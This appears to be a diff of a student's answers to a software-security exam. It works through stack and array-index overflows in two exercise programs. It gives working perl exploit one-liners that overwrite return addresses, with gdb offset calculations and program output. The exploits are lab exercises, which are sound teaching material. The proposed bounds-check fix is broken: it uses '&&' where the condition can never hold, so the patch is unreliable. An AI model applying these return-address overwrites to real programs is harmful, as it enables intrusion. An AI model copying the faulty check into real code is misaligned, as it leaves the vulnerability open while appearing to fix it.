@@ -183,8 +183,16 @@ snprintf(buffer, sizeof (buffer), "%s%s", "Hello ",  argv[1]);
 Write down a call to the program that causes the magic string to be displayed
 [8 marks].
 
-* Answer:
+* Answer:  
+perl -e 'system "./q2", "A"x38 . pack("V", 0x080483ee)'
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Forget it. You do not have access to the magic string.
+One string to bring them all, and in the darkness bind them.
 
+perl -e 'system "./q2", "A"x38 . "\xee\x83\x04\x08"'
+Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
+Forget it. You do not have access to the magic string.
+One string to bring them all, and in the darkness bind them.
 -------------------------------------------------------------------------------
 
 3. [15 marks]
@@ -192,17 +200,62 @@ Write down a call to the program that causes the magic string to be displayed
 q3 is a 32-bit debug executable built from q3.c.
 
 Locate and describe the security vulnerability in the program [3 marks].
-
 * Answer (max 3 lines):
+    - values[index] = value;
+    - Inputs are added into the array without any index validation.
+Index also recieved from the user, which does not have any boundary validation.
+It will lead to the bufferflow.
 
 Provide replacement code that fixes the problem [4 marks].
-
 * Answer (max 3 lines):
+    - Add an if condition to validate the index upper limit boundary
+    if (index < 0 && index >= 512) {
+	  return (0);
+    }
 
 Write down a call to the program that causes the foo function to execute
 [8 marks].
 
-* Answer:
+<-----------Debugging-------------->
+Step:
+1. Find the Foo method Address   --> 0x08048356
+2. Find the Return Address of the main (Saved eip at ) --> 0xffffd2ec
+3. Find the Offset between values and RA
+    3.1 Find the address of values: 0xffffcae0
+    p/d 0xffffd2ec - 0xffffcae0
+    2060/4 = 515
+3. Put the Foo Address(1) in RA(2) --->  
+As we are getting the input in integer, we need to convert the Foo Address to an Int.
+(gdb) print /d 0x8048356
+$2 = 134513494
+
+<Output>
+./q3
+Enter index and value:
+515 134513494
+Enter index and value:
+-1 1
+What a catastrophe!
+Segmentation fault (core dumped)
+</Output>
+
+Assembly of Foo:
+----------------
+Dump of assembler code for function foo:
+   0x08048356 <+0>:	push   %ebp
+   0x08048357 <+1>:	mov    %esp,%ebp
+   0x08048359 <+3>:	push   $0x80491a0
+   0x0804835e <+8>:	call   0x8048230 <puts@plt>
+   0x08048363 <+13>:	add    $0x4,%esp
+   0x08048366 <+16>:	nop
+   0x08048367 <+17>:	leave
+   0x08048368 <+18>:	ret
+End of assembler dump.
+
+
+<-----------Debugging-------------->
+
+* Answer:   perl -e 'print "515 134513494\n-1 1\n"' | ./q3
 
 -------------------------------------------------------------------------------
 
